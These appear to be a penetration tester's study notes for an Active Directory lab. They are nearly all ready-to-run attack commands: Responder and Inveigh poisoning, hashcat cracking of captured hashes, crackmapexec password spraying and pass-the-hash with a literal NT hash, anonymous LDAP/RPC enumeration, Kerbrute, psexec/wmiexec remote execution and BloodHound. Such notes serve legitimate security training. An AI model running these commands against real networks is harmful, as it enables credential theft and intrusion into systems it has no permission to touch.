## Traffic Enumeration
##### TcpDump
`sudo tcpdump -i ethx`

#### Fping
`fping -asgq IP/CIDR`

## Poisoning
#### Responder (Linux)
`responder -I ethx -A`
For cracking use the whole string 
`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
#### Inveigh (Windows)
```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```




## Windows Enumerating (From Linux)
#### NetExec
`nxc smb <IP> -u user -p pass`
Userlist example
`crackmapexec smb 172.16.5.5 -u userlist.txt -p Welcome1`
Log in example
`sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`

| Option                 | Meaning                                           |
| ---------------------- | ------------------------------------------------- |
| --pass-pol             | Password Policy                                   |
| --users                | Gets the possible users                           |
| --local-auth           | Logs into a machine one time to prevent lockout.  |
| --groups               | Shows what groups the specific user is privet too |
| --loggedon-users       | Current logged in users                           |
| --shares               | Shows the shares the the user can access          |
| -M spider_plus --share | Shares appear recursively                         |
#### RPCClient
`rpcclient -U "" -N <IP>`
```bash
querydominfo
enumdomusers (Gets the users of the target)
enumdomgroups (Gets the groups)

# To start going throught the rids of the company you can query each rid.
queryuser 0x111
```

#### Enum4linux-ng
`enum4linux-ng <IP`
`-P (Password Policy)`
#EnumeratingUsers 
`enum4linux-ng 172.16.5.5 | grep username | cut -d' ' -f4`
`enum4linux-ng -U IP | grep "user:" | cut -f2 -d "[" | cut -f1 -d "]"`

#### Ldap Enumeration
```bash
# Password Policy
ldapsearch -h IP -x -b "DC=inlane,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Looking for users
ldapsearch -h IP -x -b "DC=inlane,DC=local" -s sub "(&(objectclassuser))" | sAMAccountName: | cut -f2 -d" "

# or using Windsearch
./windapsearch.py --dc-ip IP -u "" -U
```

#### Impacket Tools
```bash
# Drops into the system32 folder of the user with the correct credentials.
psexec.py domain.local/user:'pass'@IP_Address

wmiexec.py domain.local/user:'pass'@IP_Address
```
#### SMBMap
`smbmap -u user -p pass -d domain -H IP`
Using the `-R` will recursively go through the shares of the company.
Or doing `-R 'Dept Shares' --dir-only` shows all the directories in that share.
## Kerbrute
```bash
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
./kerbrute_distro_needed

# Or
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

# User Enumeration
kerbrute userenum -d inlanefreight.local --dc IP /opt/jsmith.txt
```

## Bloodhound
```bash
bloodhound-python
sudo bloodhound-python -u 'user' -p 'pass' -ns IP -d domain -c all

sudo neo4j start 

# Then upon upload you can view the results
# Look into sharp hound as you build these notes.
```